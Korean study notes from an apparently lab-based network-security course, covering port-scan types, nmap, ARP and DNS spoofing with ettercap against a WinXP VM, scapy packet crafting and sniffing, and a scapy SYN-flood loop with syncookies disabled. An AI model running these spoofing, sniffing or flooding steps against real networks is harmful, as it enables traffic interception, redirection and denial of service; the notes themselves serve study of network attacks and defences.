## 6월 5일 TIL

#### 포트 스캐닝

- 어떤 포트가 열려 있는지 확인하는 것으로 침입 전 취약점을 분석하기 위한 사전작업 중 하나
- TCP Open Scan
  - TCP 연결과정(3-way handshaking)을 통해서 해당 포트의 실행(사용) 여부를 확인
  - 해당 포트가 유효하면: **SYN** -> SYN/ACK -> **ACK** => 연결(세션)이 수립 -> 접속(연결) 로그가 남음
  - 해당 포트가 무효하면: **SYN** -> RST/ACK
- Stealth Scan
  - 기록을 남기지 않는 포트 스캔 방법 
  - TCP half open scan = TCP SYN open scan
    - 해당 포트가 유효하면: **SYN** -> SYN/ACK -> **(RST)** => 연결이 수립되지 않음 -> 로그가 남지 않음
    - 해당 포트가 무효하면: **SYN** -> RST/ACK
  - FIN scan
    - 해당 포트가 유효하면: **FIN** -> ??? (무응답)
    - 해당 포트가 무효하면: **FIN** -> RST/ACK
  - XMAS scan
    - 해당 포트가 유효하면: **FIN+PSH+URG** -> ??? (무응답)
    - 해당 포트가 무효하면: **FIN+PSH+URG** -> RST/ACK
  - NULL scan
    - 해당 포트가 유효하면: **NULL** -> ??? (무응답)
    - 해당 포트가 무효하면: **NULL** -> RST/ACK

#### nmap (network map)

- 네트워크에 연결되어 있는 호스트의 정보를 파악하는 도구
- nmap을 이용해서 네트워크에 연결되어 있는 호스트의 IP, OS, Service Port, SW 등을 확인할 수 있음

```
nmap --help
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags <flags>: Customize TCP scan flags
  -sI <zombie host[:probeport]>: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b <FTP relay host>: FTP bounce scan

```



#### ARP(Address Resolution Protocol)

- Address Resolution Protocol의 약자로서 IP주소를 MAC주소로 변환해주는 프로토콜이다.
- IP 주소와 이에 해당하는 물리적 네트워크 주소 정보는 각 IP 호스트의 ARP 캐시라 불리는 메모리에 테이블 형태로 저장된 후 패킷 전송 시 사용 된다.

##### 스푸핑(spoofing) 이란?

- 사전적인 의미로 '속이다' 라는 뜻을 가지고 있다.

- 즉, 스푸핑 공격이란 속이는것을 이용한 공격 기법들을 얘기한다.

#### ARP Spoofing 방어

- ARP cache table에 Gateway MAC 주소를 정적으로 설정



#### MTM(Man in The Middle) attack

- 두 호스트 간에 통신을 하고 있을 때, 중간자가 사이에 끼어들어 통신 내용을 도청, 조작하는 공격



- DNS Spoofing

  - etter.dns 파일 수정

    ``` bash
    root@kali:~# gedit /etc/ettercap/etter.dns
    
    ###아래 내용 추가
    *.naver.*	A	공격자의 IP 주소 (kali#2)
    ```

  - ettercap 실행

    ```bash
    root@kali:~# ettercap -G
    ```

> \### ettercap 실행
>
> root@kali:~# ettercap -G
>
> Sniff > Unified sniffing > eth 0 ⇐ 스니핑할 NIC를 지정
>
> Hosts > Scan for hosts ⇐ 해당 LAN에 존재하는 호스트를 검색
>
> Hosts > Hosts list ⇐ 검색 결과를 확인
>
> 공격 대상을 지정
>
> target1 => Gateway (192.168.111.2)
>
> target2 => WinXP (192.168.111.140)
>
> Apr spoofing ⇒ 공격자를 공격 대상 사이에 위치 ⇒ WinXP <---> Kali#2 <---> Gateway
>
> Mitm > ARP Spoofing > Sniff remote connections 
>
> DNS Spoofing 공격
>
> Plugins > Manage the plugins > dns_spoof 
>
> WinXP에서 http://www.naver.com으로 접속을 시도 → Kali#2에서 제공하는 웹 페이지가 보이면 공격 성공



#### scapy

- 파이썬으로 작성된 패킷 조작 도구
- 패킷 디코딩, 전송, 캡처, 수정 등 다양한 기능을 제공
- https://www.itlkorea.kr/data/scapy-pocket-guide0.2.pdf

```python
>>> ls() #사용 가능한 명령어를 나타내는 것
>>> ls(TCP) #TCP 헤더 정보를 나타내는 것
sport      : ShortEnumField            = (20)
dport      : ShortEnumField            = (80)
seq        : IntField                  = (0)
ack        : IntField                  = (0)
dataofs    : BitField (4 bits)         = (None)
reserved   : BitField (4 bits)         = (0)
flags      : FlagsField (8 bits)       = (2)
window     : ShortField                = (8192)
chksum     : XShortField               = (None)
urgptr     : ShortField                = (0)
options    : TCPOptionsField           = ({})
>>> TCP().display() #현재 설정되어 있는 TCP 정보를 출력
###[ TCP ]###
  sport= ftp_data
  dport= http
  seq= 0
  ack= 0
  dataofs= None
  reserved= 0
  flags= S
  window= 8192
  chksum= None
  urgptr= 0
  options= {}
>>> lsc() #사용가능한 기능을 확인
>>> IP().display() #현재 설정된 IP 헤더 정보를 출력
###[ IP ]###
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags= 
  frag= 0
  ttl= 64
  proto= hopopt
  chksum= None
  src= 127.0.0.1
  dst= 127.0.0.1
  \options\
    
>>> ip = IP() #현재 설정된 IP 헤더 정보를 변수에 대입
>>> ip.display()

### 현재 IP 헤더에 목적지 주소를 변경
>>> ip.dst="192.168.111.131"
>>> ip.display()

### 레이어를 쌓는 방법
>>> ip = IP()
>>> tcp = TCP()
>>> packet = ip/tcp
>>> packet.display()

>>> sniff()
^C<Sniffed: TCP:0 UDP:5 ICMP:0 Other:2>
>>> sniff()
^C<Sniffed: TCP:1707 UDP:76 ICMP:0 Other:4>

>>> sf = sniff(count=10)
>>> sf.display()
0000 Ether / IP / TCP 192.168.111.133:1940 > 23.35.222.25:http A / Raw / Padding
0001 Ether / IP / TCP 192.168.111.133:1940 > 23.35.222.25:http A / Raw
0002 Ether / IP / TCP 23.35.222.25:http > 192.168.111.133:1940 A / Padding
0003 Ether / IP / TCP 23.35.222.25:http > 192.168.111.133:1940 A
0004 Ether / IP / UDP / DNS Qry "www.kali.org." 
0005 Ether / IP / UDP / DNS Qry "www.kali.org." 
0006 Ether / IP / UDP / DNS Qry "tools.kali.org." 
0007 Ether / IP / UDP / DNS Qry "tools.kali.org." 
0008 Ether / IP / UDP / DNS Qry "www.offensive-security.com." 
0009 Ether / IP / UDP / DNS Qry "www.offensive-security.com." 

>>> sf[0].show()
###[ Ethernet ]###
  dst= 00:50:56:34:96:a1
  src= 00:50:56:2b:3b:aa
  type= 0x800
###[ IP ]###
     version= 4L
     ihl= 5L
     tos= 0x0
     len= 41
     id= 21628
     flags= DF
     frag= 0L
     ttl= 128
     proto= tcp
     chksum= 0x80e8
     src= 192.168.111.133
     dst= 23.35.222.25
     \options\
###[ TCP ]###
        sport= 1940
        dport= http
        seq= 2409384850L
        ack= 1156884524
        dataofs= 5L
        reserved= 0L
        flags= A
        window= 64240
        chksum= 0xbf44
        urgptr= 0
        options= []
###[ Raw ]###
           load= '\x00'
###[ Padding ]###
              load= '\x00\x00\x00\x00\x00'

```



#### Scapy를 이용한 3-way handshaking

>\>>> ip = IP() ⇐ IP 정보를 받아와서 확인
>
>\>>> ip.display()
>
>\###[ IP ]###
>
>  version= 4
>
>  ihl= None
>
>  tos= 0x0
>
>  len= None
>
>  id= 1
>
>  flags= 
>
>  frag= 0
>
>  ttl= 64
>
>  proto= hopopt
>
>  chksum= None
>
>  src= 127.0.0.1
>
>  dst= 127.0.0.1
>
>  \options\
>
>\>>> ip.dst = "192.168.111.130" ⇐ 목적지 IP 주소를 Kali#1으로 변경하고 IP 정보를 확인
>
>\>>> ip.display()
>
>\###[ IP ]###
>
>  version= 4
>
>  ihl= None
>
>  tos= 0x0
>
>  len= None
>
>  id= 1
>
>  flags= 
>
>  frag= 0
>
>  ttl= 64
>
>  proto= hopopt
>
>  chksum= None
>
>  src= 192.168.111.131
>
>  dst= 192.168.111.130
>
>  \options\
>
>\>>> tcp = TCP() ⇐ TCP 정보를 가져와서 확인
>
>\>>> tcp.display()
>
>\###[ TCP ]###
>
>  sport= ftp_data
>
>  dport= http
>
>  seq= 0
>
>  ack= 0
>
>  dataofs= None
>
>  reserved= 0
>
>  flags= S
>
>  window= 8192
>
>  chksum= None
>
>  urgptr= 0
>
>  options= {}
>
>\>>> tcp.sport = RandNum(1024, 65535) ⇐ 출발지 포트번호를 랜덤하게 생성 후 TCP 정보를 확인
>
>\>>> tcp.display()
>
>\###[ TCP ]###
>
>  sport= <RandNum>
>
>  dport= http
>
>  seq= 0
>
>  ack= 0
>
>  dataofs= None
>
>  reserved= 0
>
>  flags= S
>
>  window= 8192
>
>  chksum= None
>
>  urgptr= 0
>
>  options= {}
>
>\>>> syn = ip/tcp ⇐ SYN 패킷을 생성
>
>\>>> syn_ack = sr1(syn) ⇐ SYN 패킷을 전송 후 첫번째 응답이 올 때까지 대
>
>Begin emission:
>
>.Finished to send 1 packets.
>
>*
>
>Received 2 packets, got 1 answers, remaining 0 packets
>
>\>>> syn_ack.display() ⇐ SYN_ACK 패킷 확인
>
>\###[ IP ]###
>
>  version= 4L
>
>  ihl= 5L
>
>  tos= 0x0
>
>  len= 44
>
>  id= 0
>
>  flags= DF
>
>  frag= 0L
>
>  ttl= 64
>
>  proto= tcp
>
>  chksum= 0xda75
>
>  src= 192.168.111.130
>
>  dst= 192.168.111.131
>
>  \options\
>
>\###[ TCP ]###
>
>​     sport= http
>
>​     dport= 52412
>
>​     seq= 2944719005L
>
>​     ack= 1
>
>​     dataofs= 6L
>
>​     reserved= 0L
>
>​     flags= SA
>
>​     window= 29200
>
>​     chksum= 0x707f
>
>​     urgptr= 0
>
>​     options= [('MSS', 1460)]
>
>\###[ Padding ]###
>
>​        load= '\x00\x00'
>
>\>>> ack = ip/TCP(sport=syn_ack[TCP].dport, dport=80, flags="A", seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq+1) ⇐ ACK 패킷 생성
>
>\>>> send(ack) ⇐ ACK 패킷 전송
>
>.
>
>Sent 1 packets.



#### TCP SYN Flooding

- SYN 패킷을 계속해서 전달

```bash
## kali#1
root@kali:~# sysctl -a | grep syncookies
net.ipv4.tcp_syncookies = 1 ## <-syncookies를 사용 = backlog que에 SYN 패킷을 저장하지 않음
sysctl: reading key "net.ipv6.conf.all.stable_secret"
sysctl: reading key "net.ipv6.conf.default.stable_secret"
sysctl: reading key "net.ipv6.conf.eth0.stable_secret"
sysctl: reading key "net.ipv6.conf.lo.stable_secret"

## 실습을 위해 syncookies 변경
root@kali:~# sysctl -w net.ipv4.tcp_syncookies=0
net.ipv4.tcp_syncookies = 0

```

```bash
## kali#2 에서 RST 패킷이 외부로 나가지 못하도록 방화벽에 등록
root@kali:~# iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

```

```python
## kali#2 scapy
>>> ip =IP()
>>> ip.dst= "192.168.111.131"
>>> tcp=TCP()
>>> tcp.dport = 80
>>> tcp.sport = RandNum(1024, 65535)
>>> tcp.flags = "S"
>>> syn = ip/tcp
>>> send(syn, loop=True)
```

